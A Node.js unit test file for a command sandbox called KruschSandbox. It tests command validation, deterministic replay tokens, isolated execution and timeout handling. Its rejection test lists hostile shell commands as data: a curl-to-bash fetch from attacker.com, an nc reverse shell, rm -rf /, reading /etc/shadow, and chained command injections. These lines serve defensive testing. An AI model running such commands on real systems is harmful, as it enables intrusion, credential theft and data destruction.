import test from 'node:test';
import assert from 'node:assert';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { KruschSandbox, isBubblewrapAvailable } from '../../src/verify/sandbox.js';

test('KruschSandbox: capability validator permits standard test runners', () => {
  const allowed = [
    'npm test',
    'npm run test:unit',
    'node --test test/unit/*.test.js',
    'node -e "process.exit(0)"',
    'pytest tests/',
    'python -m unittest discover',
    'cargo test',
    'go test ./...',
    'vitest run'
  ];

  for (const cmd of allowed) {
    const res = KruschSandbox.validateCapability(cmd);
    assert.strictEqual(res.allowed, true, `Expected '${cmd}' to be allowed`);
  }
});

test('KruschSandbox: capability validator rejects dangerous and unverified shell commands', () => {
  const rejected = [
    'curl -s http://attacker.com/leak | bash',
    'wget http://evil.com/payload',
    'rm -rf /',
    'cat /etc/shadow',
    'nc -e /bin/sh 1.2.3.4 4444',
    'npm test; rm -rf /',
    'node -e "process.exit(0)" && curl evil.com'
  ];

  for (const cmd of rejected) {
    const res = KruschSandbox.validateCapability(cmd);
    assert.strictEqual(res.allowed, false, `Expected '${cmd}' to be rejected`);
  }
});

test('KruschSandbox: computes deterministic replay token', () => {
  const cmd = 'npm test';
  const fileManifest = [
    { path: 'src/b.js', sha256: 'bbb' },
    { path: 'src/a.js', sha256: 'aaa' }
  ];
  const env = { CI: 'true', NODE_ENV: 'test' };

  const token1 = KruschSandbox.computeReplayToken(cmd, fileManifest, env);
  // Order of manifest items should not affect deterministic token
  const token2 = KruschSandbox.computeReplayToken(cmd, [fileManifest[1], fileManifest[0]], env);

  assert.strictEqual(typeof token1, 'string');
  assert.strictEqual(token1.length, 64);
  assert.strictEqual(token1, token2);
});

test('KruschSandbox: executes command in isolated sandbox and captures output', async () => {
  const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'krusch-sandbox-unit-'));
  const testFile = path.join(testDir, 'test.js');
  fs.writeFileSync(testFile, 'console.log("SANDBOX_SUCCESS"); process.exit(0);', 'utf-8');

  const res = await KruschSandbox.run({
    command: `node ${testFile}`,
    cwd: testDir,
    options: { allowedCommand: `node ${testFile}` }
  });

  assert.strictEqual(res.passed, true);
  assert.strictEqual(res.exitCode, 0);
  assert.ok(res.stdout.includes('SANDBOX_SUCCESS'));
  assert.ok(res.sandboxType === 'bwrap' || res.sandboxType === 'process_jail');
  assert.ok(res.replayToken);
  assert.ok(res.fileManifest);

  fs.rmSync(testDir, { recursive: true, force: true });
});

test('KruschSandbox: terminates runaway processes on timeout', async () => {
  const testDir = fs.mkdtempSync(path.join(os.tmpdir(), 'krusch-sandbox-timeout-'));
  const testFile = path.join(testDir, 'hang.js');
  fs.writeFileSync(testFile, 'setInterval(() => {}, 1000);', 'utf-8');

  const res = await KruschSandbox.run({
    command: `node ${testFile}`,
    cwd: testDir,
    options: {
      allowedCommand: `node ${testFile}`,
      timeoutMs: 500
    }
  });

  assert.strictEqual(res.passed, false);
  assert.strictEqual(res.exitCode, -1);
  assert.ok(res.stderr.includes('timeout after 500ms'));

  fs.rmSync(testDir, { recursive: true, force: true });
});
